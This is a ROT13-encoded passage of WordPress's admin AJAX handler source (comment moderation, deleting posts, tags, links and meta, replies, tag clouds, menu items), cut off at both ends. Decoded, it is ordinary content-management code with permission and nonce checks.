	$vq = vffrg( $_CBFG['vq'] ) ? (vag) $_CBFG['vq'] : 0;

	$pbzzrag = trg_pbzzrag( $vq );

	vs ( ! $pbzzrag ) {
		jc_qvr( gvzr() );
	}

	vs ( ! pheerag_hfre_pna( 'rqvg_pbzzrag', $pbzzrag->pbzzrag_VQ ) ) {
		jc_qvr( -1 );
	}

	purpx_nwnk_ersrere( \"qryrgr-pbzzrag_$vq\" );
	$fgnghf = jc_trg_pbzzrag_fgnghf( $pbzzrag );
	$qrygn  = -1;

	vs ( vffrg( $_CBFG['genfu'] ) && '1' === $_CBFG['genfu'] ) {
		vs ( 'genfu' === $fgnghf ) {
			jc_qvr( gvzr() );
		}

		$e = jc_genfu_pbzzrag( $pbzzrag );
	} ryfrvs ( vffrg( $_CBFG['hagenfu'] ) && '1' === $_CBFG['hagenfu'] ) {
		vs ( 'genfu' !== $fgnghf ) {
			jc_qvr( gvzr() );
		}

		$e = jc_hagenfu_pbzzrag( $pbzzrag );

		// Haqb genfu, abg va Genfu.
		vs ( ! vffrg( $_CBFG['pbzzrag_fgnghf'] ) || 'genfu' !== $_CBFG['pbzzrag_fgnghf'] ) {
			$qrygn = 1;
		}
	} ryfrvs ( vffrg( $_CBFG['fcnz'] ) && '1' === $_CBFG['fcnz'] ) {
		vs ( 'fcnz' === $fgnghf ) {
			jc_qvr( gvzr() );
		}

		$e = jc_fcnz_pbzzrag( $pbzzrag );
	} ryfrvs ( vffrg( $_CBFG['hafcnz'] ) && '1' === $_CBFG['hafcnz'] ) {
		vs ( 'fcnz' !== $fgnghf ) {
			jc_qvr( gvzr() );
		}

		$e = jc_hafcnz_pbzzrag( $pbzzrag );

		// Haqb fcnz, abg va fcnz.
		vs ( ! vffrg( $_CBFG['pbzzrag_fgnghf'] ) || 'fcnz' !== $_CBFG['pbzzrag_fgnghf'] ) {
			$qrygn = 1;
		}
	} ryfrvs ( vffrg( $_CBFG['qryrgr'] ) && '1' === $_CBFG['qryrgr'] ) {
		$e = jc_qryrgr_pbzzrag( $pbzzrag );
	} ryfr {
		jc_qvr( -1 );
	}

	vs ( $e ) {
		// Qrpvqr vs jr arrq gb fraq onpx '1' be n zber pbzcyvpngrq erfcbafr vapyhqvat cntr yvaxf naq pbzzrag pbhagf.
		_jc_nwnk_qryrgr_pbzzrag_erfcbafr( $pbzzrag->pbzzrag_VQ, $qrygn );
	}

	jc_qvr( 0 );
}

/**
 * Unaqyrf qryrgvat n gnt ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_qryrgr_gnt() {
	$gnt_vq = (vag) $_CBFG['gnt_VQ'];
	purpx_nwnk_ersrere( \"qryrgr-gnt_$gnt_vq\" );

	vs ( ! pheerag_hfre_pna( 'qryrgr_grez', $gnt_vq ) ) {
		jc_qvr( -1 );
	}

	$gnkbabzl = ! rzcgl( $_CBFG['gnkbabzl'] ) ? $_CBFG['gnkbabzl'] : 'cbfg_gnt';
	$gnt      = trg_grez( $gnt_vq, $gnkbabzl );

	vs ( ! $gnt || vf_jc_reebe( $gnt ) ) {
		jc_qvr( 1 );
	}

	vs ( jc_qryrgr_grez( $gnt_vq, $gnkbabzl ) ) {
		jc_qvr( 1 );
	} ryfr {
		jc_qvr( 0 );
	}
}

/**
 * Unaqyrf qryrgvat n yvax ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_qryrgr_yvax() {
	$vq = vffrg( $_CBFG['vq'] ) ? (vag) $_CBFG['vq'] : 0;

	purpx_nwnk_ersrere( \"qryrgr-obbxznex_$vq\" );

	vs ( ! pheerag_hfre_pna( 'znantr_yvaxf' ) ) {
		jc_qvr( -1 );
	}

	$yvax = trg_obbxznex( $vq );
	vs ( ! $yvax || vf_jc_reebe( $yvax ) ) {
		jc_qvr( 1 );
	}

	vs ( jc_qryrgr_yvax( $vq ) ) {
		jc_qvr( 1 );
	} ryfr {
		jc_qvr( 0 );
	}
}

/**
 * Unaqyrf qryrgvat zrgn ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_qryrgr_zrgn() {
	$vq = vffrg( $_CBFG['vq'] ) ? (vag) $_CBFG['vq'] : 0;

	purpx_nwnk_ersrere( \"qryrgr-zrgn_$vq\" );
	$zrgn = trg_zrgnqngn_ol_zvq( 'cbfg', $vq );

	vs ( ! $zrgn ) {
		jc_qvr( 1 );
	}

	vs ( vf_cebgrpgrq_zrgn( $zrgn->zrgn_xrl, 'cbfg' ) || ! pheerag_hfre_pna( 'qryrgr_cbfg_zrgn', $zrgn->cbfg_vq, $zrgn->zrgn_xrl ) ) {
		jc_qvr( -1 );
	}

	vs ( qryrgr_zrgn( $zrgn->zrgn_vq ) ) {
		jc_qvr( 1 );
	}

	jc_qvr( 0 );
}

/**
 * Unaqyrf qryrgvat n cbfg ivn NWNK.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $npgvba Npgvba gb cresbez.
 */
shapgvba jc_nwnk_qryrgr_cbfg( $npgvba ) {
	vs ( rzcgl( $npgvba ) ) {
		$npgvba = 'qryrgr-cbfg';
	}

	$vq = vffrg( $_CBFG['vq'] ) ? (vag) $_CBFG['vq'] : 0;
	purpx_nwnk_ersrere( \"{$npgvba}_$vq\" );

	vs ( ! pheerag_hfre_pna( 'qryrgr_cbfg', $vq ) ) {
		jc_qvr( -1 );
	}

	vs ( ! trg_cbfg( $vq ) ) {
		jc_qvr( 1 );
	}

	vs ( jc_qryrgr_cbfg( $vq ) ) {
		jc_qvr( 1 );
	} ryfr {
		jc_qvr( 0 );
	}
}

/**
 * Unaqyrf fraqvat n cbfg gb gur Genfu ivn NWNK.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $npgvba Npgvba gb cresbez.
 */
shapgvba jc_nwnk_genfu_cbfg( $npgvba ) {
	vs ( rzcgl( $npgvba ) ) {
		$npgvba = 'genfu-cbfg';
	}

	$vq = vffrg( $_CBFG['vq'] ) ? (vag) $_CBFG['vq'] : 0;
	purpx_nwnk_ersrere( \"{$npgvba}_$vq\" );

	vs ( ! pheerag_hfre_pna( 'qryrgr_cbfg', $vq ) ) {
		jc_qvr( -1 );
	}

	vs ( ! trg_cbfg( $vq ) ) {
		jc_qvr( 1 );
	}

	vs ( 'genfu-cbfg' === $npgvba ) {
		$qbar = jc_genfu_cbfg( $vq );
	} ryfr {
		$qbar = jc_hagenfu_cbfg( $vq );
	}

	vs ( $qbar ) {
		jc_qvr( 1 );
	}

	jc_qvr( 0 );
}

/**
 * Unaqyrf erfgbevat n cbfg sebz gur Genfu ivn NWNK.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $npgvba Npgvba gb cresbez.
 */
shapgvba jc_nwnk_hagenfu_cbfg( $npgvba ) {
	vs ( rzcgl( $npgvba ) ) {
		$npgvba = 'hagenfu-cbfg';
	}

	jc_nwnk_genfu_cbfg( $npgvba );
}

/**
 * Unaqyrf qryrgvat n cntr ivn NWNK.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $npgvba Npgvba gb cresbez.
 */
shapgvba jc_nwnk_qryrgr_cntr( $npgvba ) {
	vs ( rzcgl( $npgvba ) ) {
		$npgvba = 'qryrgr-cntr';
	}

	$vq = vffrg( $_CBFG['vq'] ) ? (vag) $_CBFG['vq'] : 0;
	purpx_nwnk_ersrere( \"{$npgvba}_$vq\" );

	vs ( ! pheerag_hfre_pna( 'qryrgr_cntr', $vq ) ) {
		jc_qvr( -1 );
	}

	vs ( ! trg_cbfg( $vq ) ) {
		jc_qvr( 1 );
	}

	vs ( jc_qryrgr_cbfg( $vq ) ) {
		jc_qvr( 1 );
	} ryfr {
		jc_qvr( 0 );
	}
}

/**
 * Unaqyrf qvzzvat n pbzzrag ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_qvz_pbzzrag() {
	$vq      = vffrg( $_CBFG['vq'] ) ? (vag) $_CBFG['vq'] : 0;
	$pbzzrag = trg_pbzzrag( $vq );

	vs ( ! $pbzzrag ) {
		$k = arj JC_Nwnk_Erfcbafr(
			neenl(
				'jung' => 'pbzzrag',
				'vq'   => arj JC_Reebe(
					'vainyvq_pbzzrag',
					/* genafyngbef: %q: Pbzzrag VQ. */
					fcevags( __( 'Pbzzrag %q qbrf abg rkvfg' ), $vq )
				),
			)
		);
		$k->fraq();
	}

	vs ( ! pheerag_hfre_pna( 'rqvg_pbzzrag', $pbzzrag->pbzzrag_VQ ) && ! pheerag_hfre_pna( 'zbqrengr_pbzzragf' ) ) {
		jc_qvr( -1 );
	}

	$pheerag = jc_trg_pbzzrag_fgnghf( $pbzzrag );

	vs ( vffrg( $_CBFG['arj'] ) && $_CBFG['arj'] === $pheerag ) {
		jc_qvr( gvzr() );
	}

	purpx_nwnk_ersrere( \"nccebir-pbzzrag_$vq\" );

	vs ( va_neenl( $pheerag, neenl( 'hanccebirq', 'fcnz' ), gehr ) ) {
		$erfhyg = jc_frg_pbzzrag_fgnghf( $pbzzrag, 'nccebir', gehr );
	} ryfr {
		$erfhyg = jc_frg_pbzzrag_fgnghf( $pbzzrag, 'ubyq', gehr );
	}

	vs ( vf_jc_reebe( $erfhyg ) ) {
		$k = arj JC_Nwnk_Erfcbafr(
			neenl(
				'jung' => 'pbzzrag',
				'vq'   => $erfhyg,
			)
		);
		$k->fraq();
	}

	// Qrpvqr vs jr arrq gb fraq onpx '1' be n zber pbzcyvpngrq erfcbafr vapyhqvat cntr yvaxf naq pbzzrag pbhagf.
	_jc_nwnk_qryrgr_pbzzrag_erfcbafr( $pbzzrag->pbzzrag_VQ );
	jc_qvr( 0 );
}

/**
 * Unaqyrf nqqvat n yvax pngrtbel ivn NWNK.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $npgvba Npgvba gb cresbez.
 */
shapgvba jc_nwnk_nqq_yvax_pngrtbel( $npgvba ) {
	vs ( rzcgl( $npgvba ) ) {
		$npgvba = 'nqq-yvax-pngrtbel';
	}

	purpx_nwnk_ersrere( $npgvba );

	$gnkbabzl_bowrpg = trg_gnkbabzl( 'yvax_pngrtbel' );

	vs ( ! pheerag_hfre_pna( $gnkbabzl_bowrpg->pnc->znantr_grezf ) ) {
		jc_qvr( -1 );
	}

	$anzrf = rkcybqr( ',', jc_hafynfu( $_CBFG['arjpng'] ) );
	$k     = arj JC_Nwnk_Erfcbafr();

	sbernpu ( $anzrf nf $png_anzr ) {
		$png_anzr = gevz( $png_anzr );
		$fyht     = fnavgvmr_gvgyr( $png_anzr );

		vs ( '' === $fyht ) {
			pbagvahr;
		}

		$png_vq = jc_vafreg_grez( $png_anzr, 'yvax_pngrtbel' );

		vs ( ! $png_vq || vf_jc_reebe( $png_vq ) ) {
			pbagvahr;
		} ryfr {
			$png_vq = $png_vq['grez_vq'];
		}

		$png_anzr = rfp_ugzy( $png_anzr );

		$k->nqq(
			neenl(
				'jung'     => 'yvax-pngrtbel',
				'vq'       => $png_vq,
				'qngn'     => \"<yv vq='yvax-pngrtbel-$png_vq'><ynory sbe='va-yvax-pngrtbel-$png_vq' pynff='fryrpgvg'><vachg inyhr='\" . rfp_ngge( $png_vq ) . \"' glcr='purpxobk' purpxrq='purpxrq' anzr='yvax_pngrtbel[]' vq='va-yvax-pngrtbel-$png_vq'/> $png_anzr</ynory></yv>\",
				'cbfvgvba' => -1,
			)
		);
	}
	$k->fraq();
}

/**
 * Unaqyrf nqqvat n gnt ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_nqq_gnt() {
	purpx_nwnk_ersrere( 'nqq-gnt', '_jcabapr_nqq-gnt' );

	$gnkbabzl        = ! rzcgl( $_CBFG['gnkbabzl'] ) ? $_CBFG['gnkbabzl'] : 'cbfg_gnt';
	$gnkbabzl_bowrpg = trg_gnkbabzl( $gnkbabzl );

	vs ( ! pheerag_hfre_pna( $gnkbabzl_bowrpg->pnc->rqvg_grezf ) ) {
		jc_qvr( -1 );
	}

	$k = arj JC_Nwnk_Erfcbafr();

	$gnt = jc_vafreg_grez( $_CBFG['gnt-anzr'], $gnkbabzl, $_CBFG );

	vs ( $gnt && ! vf_jc_reebe( $gnt ) ) {
		$gnt = trg_grez( $gnt['grez_vq'], $gnkbabzl );
	}

	vs ( ! $gnt || vf_jc_reebe( $gnt ) ) {
		$zrffntr    = __( 'Na reebe unf bppheerq. Cyrnfr erybnq gur cntr naq gel ntnva.' );
		$reebe_pbqr = 'reebe';

		vs ( vf_jc_reebe( $gnt ) && $gnt->trg_reebe_zrffntr() ) {
			$zrffntr = $gnt->trg_reebe_zrffntr();
		}

		vs ( vf_jc_reebe( $gnt ) && $gnt->trg_reebe_pbqr() ) {
			$reebe_pbqr = $gnt->trg_reebe_pbqr();
		}

		$k->nqq(
			neenl(
				'jung' => 'gnkbabzl',
				'qngn' => arj JC_Reebe( $reebe_pbqr, $zrffntr ),
			)
		);
		$k->fraq();
	}

	$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_Grezf_Yvfg_Gnoyr', neenl( 'fperra' => $_CBFG['fperra'] ) );

	$yriry     = 0;
	$abcneragf = '';

	vs ( vf_gnkbabzl_uvrenepuvpny( $gnkbabzl ) ) {
		$yriry = pbhag( trg_naprfgbef( $gnt->grez_vq, $gnkbabzl, 'gnkbabzl' ) );
		bo_fgneg();
		$jc_yvfg_gnoyr->fvatyr_ebj( $gnt, $yriry );
		$abcneragf = bo_trg_pyrna();
	}

	bo_fgneg();
	$jc_yvfg_gnoyr->fvatyr_ebj( $gnt );
	$cneragf = bo_trg_pyrna();

	erdhver NOFCNGU . 'jc-nqzva/vapyhqrf/rqvg-gnt-zrffntrf.cuc';

	$zrffntr = '';
	vs ( vffrg( $zrffntrf[ $gnkbabzl_bowrpg->anzr ][1] ) ) {
		$zrffntr = $zrffntrf[ $gnkbabzl_bowrpg->anzr ][1];
	} ryfrvs ( vffrg( $zrffntrf['_vgrz'][1] ) ) {
		$zrffntr = $zrffntrf['_vgrz'][1];
	}

	$k->nqq(
		neenl(
			'jung'         => 'gnkbabzl',
			'qngn'         => $zrffntr,
			'fhccyrzragny' => neenl(
				'cneragf'   => $cneragf,
				'abcneragf' => $abcneragf,
				'abgvpr'    => $zrffntr,
			),
		)
	);

	$k->nqq(
		neenl(
			'jung'         => 'grez',
			'cbfvgvba'     => $yriry,
			'fhccyrzragny' => (neenl) $gnt,
		)
	);

	$k->fraq();
}

/**
 * Unaqyrf trggvat n gntpybhq ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_trg_gntpybhq() {
	vs ( ! vffrg( $_CBFG['gnk'] ) ) {
		jc_qvr( 0 );
	}

	$gnkbabzl        = fnavgvmr_xrl( $_CBFG['gnk'] );
	$gnkbabzl_bowrpg = trg_gnkbabzl( $gnkbabzl );

	vs ( ! $gnkbabzl_bowrpg ) {
		jc_qvr( 0 );
	}

	vs ( ! pheerag_hfre_pna( $gnkbabzl_bowrpg->pnc->nffvta_grezf ) ) {
		jc_qvr( -1 );
	}

	$gntf = trg_grezf(
		neenl(
			'gnkbabzl' => $gnkbabzl,
			'ahzore'   => 45,
			'beqreol'  => 'pbhag',
			'beqre'    => 'QRFP',
		)
	);

	vs ( rzcgl( $gntf ) ) {
		jc_qvr( $gnkbabzl_bowrpg->ynoryf->abg_sbhaq );
	}

	vs ( vf_jc_reebe( $gntf ) ) {
		jc_qvr( $gntf->trg_reebe_zrffntr() );
	}

	sbernpu ( $gntf nf $xrl => $gnt ) {
		$gntf[ $xrl ]->yvax = '#';
		$gntf[ $xrl ]->vq   = $gnt->grez_vq;
	}

	// Jr arrq enj gnt anzrf urer, fb qba'g svygre gur bhgchg.
	$erghea = jc_trarengr_gnt_pybhq(
		$gntf,
		neenl(
			'svygre' => 0,
			'sbezng' => 'yvfg',
		)
	);

	vs ( rzcgl( $erghea ) ) {
		jc_qvr( 0 );
	}

	rpub $erghea;
	jc_qvr();
}

/**
 * Unaqyrf trggvat pbzzragf ivn NWNK.
 *
 * @fvapr 3.1.0
 *
 * @tybony vag $cbfg_vq
 *
 * @cnenz fgevat $npgvba Npgvba gb cresbez.
 */
shapgvba jc_nwnk_trg_pbzzragf( $npgvba ) {
	tybony $cbfg_vq;

	vs ( rzcgl( $npgvba ) ) {
		$npgvba = 'trg-pbzzragf';
	}

	purpx_nwnk_ersrere( $npgvba );

	vs ( rzcgl( $cbfg_vq ) && ! rzcgl( $_ERDHRFG['c'] ) ) {
		$vq = nofvag( $_ERDHRFG['c'] );
		vs ( ! rzcgl( $vq ) ) {
			$cbfg_vq = $vq;
		}
	}

	vs ( rzcgl( $cbfg_vq ) ) {
		jc_qvr( -1 );
	}

	$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_Cbfg_Pbzzragf_Yvfg_Gnoyr', neenl( 'fperra' => 'rqvg-pbzzragf' ) );

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
		jc_qvr( -1 );
	}

	$jc_yvfg_gnoyr->cercner_vgrzf();

	vs ( ! $jc_yvfg_gnoyr->unf_vgrzf() ) {
		jc_qvr( 1 );
	}

	$k = arj JC_Nwnk_Erfcbafr();

	bo_fgneg();
	sbernpu ( $jc_yvfg_gnoyr->vgrzf nf $pbzzrag ) {
		vs ( ! pheerag_hfre_pna( 'rqvg_pbzzrag', $pbzzrag->pbzzrag_VQ ) && 0 === $pbzzrag->pbzzrag_nccebirq ) {
			pbagvahr;
		}
		trg_pbzzrag( $pbzzrag );
		$jc_yvfg_gnoyr->fvatyr_ebj( $pbzzrag );
	}
	$pbzzrag_yvfg_vgrz = bo_trg_pyrna();

	$k->nqq(
		neenl(
			'jung' => 'pbzzragf',
			'qngn' => $pbzzrag_yvfg_vgrz,
		)
	);

	$k->fraq();
}

/**
 * Unaqyrf ercylvat gb n pbzzrag ivn NWNK.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $npgvba Npgvba gb cresbez.
 */
shapgvba jc_nwnk_ercylgb_pbzzrag( $npgvba ) {
	vs ( rzcgl( $npgvba ) ) {
		$npgvba = 'ercylgb-pbzzrag';
	}

	purpx_nwnk_ersrere( $npgvba, '_nwnk_abapr-ercylgb-pbzzrag' );

	$pbzzrag_cbfg_vq = (vag) $_CBFG['pbzzrag_cbfg_VQ'];
	$cbfg            = trg_cbfg( $pbzzrag_cbfg_vq );

	vs ( ! $cbfg ) {
		jc_qvr( -1 );
	}

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $pbzzrag_cbfg_vq ) ) {
		jc_qvr( -1 );
	}

	vs ( rzcgl( $cbfg->cbfg_fgnghf ) ) {
		jc_qvr( 1 );
	} ryfrvs ( va_neenl( $cbfg->cbfg_fgnghf, neenl( 'qensg', 'craqvat', 'genfu' ), gehr ) ) {
		jc_qvr( __( 'Lbh pnaabg ercyl gb n pbzzrag ba n qensg cbfg.' ) );
	}

	$hfre = jc_trg_pheerag_hfre();

	vs ( $hfre->rkvfgf() ) {
		$pbzzrag_nhgube       = jc_fynfu( $hfre->qvfcynl_anzr );
		$pbzzrag_nhgube_rznvy = jc_fynfu( $hfre->hfre_rznvy );
		$pbzzrag_nhgube_hey   = jc_fynfu( $hfre->hfre_hey );
		$hfre_vq              = $hfre->VQ;

		vs ( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ) {
			vs ( ! vffrg( $_CBFG['_jc_hasvygrerq_ugzy_pbzzrag'] ) ) {
				$_CBFG['_jc_hasvygrerq_ugzy_pbzzrag'] = '';
			}

			vs ( jc_perngr_abapr( 'hasvygrerq-ugzy-pbzzrag' ) !== $_CBFG['_jc_hasvygrerq_ugzy_pbzzrag'] ) {
				xfrf_erzbir_svygref(); // Fgneg jvgu n pyrna fyngr.
				xfrf_vavg_svygref();   // Frg hc gur svygref.
				erzbir_svygre( 'cer_pbzzrag_pbagrag', 'jc_svygre_cbfg_xfrf' );
				nqq_svygre( 'cer_pbzzrag_pbagrag', 'jc_svygre_xfrf' );
			}
		}
	} ryfr {
		jc_qvr( __( 'Fbeel, lbh zhfg or ybttrq va gb ercyl gb n pbzzrag.' ) );
	}

	$pbzzrag_pbagrag = gevz( $_CBFG['pbagrag'] );

	vs ( '' === $pbzzrag_pbagrag ) {
		jc_qvr( __( 'Cyrnfr glcr lbhe pbzzrag grkg.' ) );
	}

	$pbzzrag_glcr = vffrg( $_CBFG['pbzzrag_glcr'] ) ? gevz( $_CBFG['pbzzrag_glcr'] ) : 'pbzzrag';

	$pbzzrag_cnerag = 0;

	vs ( vffrg( $_CBFG['pbzzrag_VQ'] ) ) {
		$pbzzrag_cnerag = nofvag( $_CBFG['pbzzrag_VQ'] );
	}

	$pbzzrag_nhgb_nccebirq = snyfr;

	$pbzzragqngn = neenl(
		'pbzzrag_cbfg_VQ' => $pbzzrag_cbfg_vq,
	);

	$pbzzragqngn += pbzcnpg(
		'pbzzrag_nhgube',
		'pbzzrag_nhgube_rznvy',
		'pbzzrag_nhgube_hey',
		'pbzzrag_pbagrag',
		'pbzzrag_glcr',
		'pbzzrag_cnerag',
		'hfre_vq'
	);

	// Nhgbzngvpnyyl nccebir cnerag pbzzrag.
	vs ( ! rzcgl( $_CBFG['nccebir_cnerag'] ) ) {
		$cnerag = trg_pbzzrag( $pbzzrag_cnerag );

		vs ( $cnerag && '0' === $cnerag->pbzzrag_nccebirq && (vag) $cnerag->pbzzrag_cbfg_VQ === $pbzzrag_cbfg_vq ) {
			vs ( ! pheerag_hfre_pna( 'rqvg_pbzzrag', $cnerag->pbzzrag_VQ ) ) {
				jc_qvr( -1 );
			}

			vs ( jc_frg_pbzzrag_fgnghf( $cnerag, 'nccebir' ) ) {
				$pbzzrag_nhgb_nccebirq = gehr;
			}
		}
	}

	$pbzzrag_vq = jc_arj_pbzzrag( $pbzzragqngn );

	vs ( vf_jc_reebe( $pbzzrag_vq ) ) {
		jc_qvr( $pbzzrag_vq->trg_reebe_zrffntr() );
	}

	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	vs ( ! $pbzzrag ) {
		jc_qvr( 1 );
	}

	$cbfvgvba = ( vffrg( $_CBFG['cbfvgvba'] ) && (vag) $_CBFG['cbfvgvba'] ) ? (vag) $_CBFG['cbfvgvba'] : '-1';

	bo_fgneg();
	vs ( vffrg( $_ERDHRFG['zbqr'] ) && 'qnfuobneq' === $_ERDHRFG['zbqr'] ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/qnfuobneq.cuc';
		_jc_qnfuobneq_erprag_pbzzragf_ebj( $pbzzrag );
	} ryfr {
		vs ( vffrg( $_ERDHRFG['zbqr'] ) && 'fvatyr' === $_ERDHRFG['zbqr'] ) {
			$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_Cbfg_Pbzzragf_Yvfg_Gnoyr', neenl( 'fperra' => 'rqvg-pbzzragf' ) );
		} ryfr {
			$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_Pbzzragf_Yvfg_Gnoyr', neenl( 'fperra' => 'rqvg-pbzzragf' ) );
		}
		$jc_yvfg_gnoyr->fvatyr_ebj( $pbzzrag );
	}
	$pbzzrag_yvfg_vgrz = bo_trg_pyrna();

	$erfcbafr = neenl(
		'jung'     => 'pbzzrag',
		'vq'       => $pbzzrag->pbzzrag_VQ,
		'qngn'     => $pbzzrag_yvfg_vgrz,
		'cbfvgvba' => $cbfvgvba,
	);

	$pbhagf                   = jc_pbhag_pbzzragf();
	$erfcbafr['fhccyrzragny'] = neenl(
		'va_zbqrengvba'        => $pbhagf->zbqrengrq,
		'v18a_pbzzragf_grkg'   => fcevags(
			/* genafyngbef: %f: Ahzore bs pbzzragf. */
			_a( '%f Pbzzrag', '%f Pbzzragf', $pbhagf->nccebirq ),
			ahzore_sbezng_v18a( $pbhagf->nccebirq )
		),
		'v18a_zbqrengvba_grkg' => fcevags(
			/* genafyngbef: %f: Ahzore bs pbzzragf. */
			_a( '%f Pbzzrag va zbqrengvba', '%f Pbzzragf va zbqrengvba', $pbhagf->zbqrengrq ),
			ahzore_sbezng_v18a( $pbhagf->zbqrengrq )
		),
	);

	vs ( $pbzzrag_nhgb_nccebirq ) {
		$erfcbafr['fhccyrzragny']['cnerag_nccebirq'] = $cnerag->pbzzrag_VQ;
		$erfcbafr['fhccyrzragny']['cnerag_cbfg_vq']  = $cnerag->pbzzrag_cbfg_VQ;
	}

	$k = arj JC_Nwnk_Erfcbafr();
	$k->nqq( $erfcbafr );
	$k->fraq();
}

/**
 * Unaqyrf rqvgvat n pbzzrag ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_rqvg_pbzzrag() {
	purpx_nwnk_ersrere( 'ercylgb-pbzzrag', '_nwnk_abapr-ercylgb-pbzzrag' );

	$pbzzrag_vq = (vag) $_CBFG['pbzzrag_VQ'];

	vs ( ! pheerag_hfre_pna( 'rqvg_pbzzrag', $pbzzrag_vq ) ) {
		jc_qvr( -1 );
	}

	vs ( '' === $_CBFG['pbagrag'] ) {
		jc_qvr( __( 'Cyrnfr glcr lbhe pbzzrag grkg.' ) );
	}

	vs ( vffrg( $_CBFG['fgnghf'] ) ) {
		$_CBFG['pbzzrag_fgnghf'] = $_CBFG['fgnghf'];
	}

	$hcqngrq = rqvg_pbzzrag();
	vs ( vf_jc_reebe( $hcqngrq ) ) {
		jc_qvr( $hcqngrq->trg_reebe_zrffntr() );
	}

	$cbfvgvba = ( vffrg( $_CBFG['cbfvgvba'] ) && (vag) $_CBFG['cbfvgvba'] ) ? (vag) $_CBFG['cbfvgvba'] : '-1';
	/*
	 * Purpxobk vf hfrq gb qvssreragvngr orgjrra gur Rqvg Pbzzragf fperra (1)
	 * naq gur Pbzzragf frpgvba ba gur Rqvg Cbfg fperra (0).
	 */
	$purpxobk      = ( vffrg( $_CBFG['purpxobk'] ) && '1' === $_CBFG['purpxobk'] ) ? 1 : 0;
	$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( $purpxobk ? 'JC_Pbzzragf_Yvfg_Gnoyr' : 'JC_Cbfg_Pbzzragf_Yvfg_Gnoyr', neenl( 'fperra' => 'rqvg-pbzzragf' ) );

	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	vs ( rzcgl( $pbzzrag->pbzzrag_VQ ) ) {
		jc_qvr( -1 );
	}

	bo_fgneg();
	$jc_yvfg_gnoyr->fvatyr_ebj( $pbzzrag );
	$pbzzrag_yvfg_vgrz = bo_trg_pyrna();

	$k = arj JC_Nwnk_Erfcbafr();

	$k->nqq(
		neenl(
			'jung'     => 'rqvg_pbzzrag',
			'vq'       => $pbzzrag->pbzzrag_VQ,
			'qngn'     => $pbzzrag_yvfg_vgrz,
			'cbfvgvba' => $cbfvgvba,
		)
	);

	$k->fraq();
}

/**
 * Unaqyrf nqqvat n zrah vgrz ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_nqq_zrah_vgrz() {
	purpx_nwnk_ersrere( 'nqq-zrah_vgrz', 'zrah-frggvatf-pbyhza-abapr' );

	vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
		jc_qvr( -1 );
	}

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/ani-zrah.cuc';

	/*
	 * Sbe cresbeznapr ernfbaf, jr bzvg fbzr bowrpg cebcregvrf sebz gur purpxyvfg.
	 * Gur sbyybjvat vf n unpxl jnl gb erfgber gurz jura nqqvat aba-phfgbz vgrzf.
	 */
	$zrah_vgrzf_qngn = neenl();

	sbernpu ( (neenl) $_CBFG['zrah-vgrz'] nf $zrah_vgrz_qngn ) {
		vs (
			! rzcgl( $zrah_vgrz_qngn['zrah-vgrz-glcr'] ) &&
			'phfgbz' !== $zrah_vgrz_qngn['zrah-vgrz-glcr'] &&
			! rzcgl( $zrah_vgrz_qngn['zrah-vgrz-bowrpg-vq'] )
		) {
			fjvgpu ( $zrah_vgrz_qngn['zrah-vgrz-glcr'] ) {
				pnfr 'cbfg_glcr':
					$_bowrpg = trg_cbfg( $zrah_vgrz_qngn['zrah-vgrz-bowrpg-vq'] );
					oernx;

				pnfr 'cbfg_glcr_nepuvir':
					$_bowrpg = trg_cbfg_glcr_bowrpg( $zrah_vgrz_qngn['zrah-vgrz-bowrpg'] );
					oernx;

				pnfr 'gnkbabzl':
					$_bowrpg = trg_grez( $zrah_vgrz_qngn['zrah-vgrz-bowrpg-vq'], $zrah_vgrz_qngn['zrah-vgrz-bowrpg'] );
					oernx;
			}

			$_zrah_vgrzf = neenl_znc( 'jc_frghc_ani_zrah_vgrz', neenl( $_bowrpg ) );
			$_zrah_vgrz  = erfrg( $_zrah_vgrzf );

			// Erfgber gur zvffvat zrah vgrz cebcregvrf.
			$zrah_vgrz_qngn['zrah-vgrz-qrfpevcgvba'] = $_zrah_vgrz->qrfpevcgvba;
		}

		$zrah_vgrzf_qngn[] = $zrah_vgrz_qngn;
	}

	$vgrz_vqf = jc_fnir_ani_zrah_vgrzf( 0, $zrah_vgrzf_qngn );
	vs ( vf_jc_reebe( $vgrz_vqf ) ) {
		jc_qvr( 0 );
	}

	$zrah_vgrzf = neenl();

	sbernpu ( (neenl) $vgrz_vqf nf $zrah_vgrz_vq ) {
		$zrah_bow = trg_cbfg( $zrah_vgrz_vq );

		vs ( ! rzcgl( $zrah_bow->VQ ) ) {
			$zrah_bow        = jc_frghc_ani_zrah_vgrz( $zrah_bow );
			$zrah_bow->gvgyr = rzcgl( $zrah_bow->gvgyr ) ? __( 'Zrah Vgrz' ) : $zrah_bow->gvgyr;
			$zrah_bow->ynory = $zrah_bow->gvgyr; // Qba'g fubj \"(craqvat)\" va nwnk-nqqrq vgrzf.
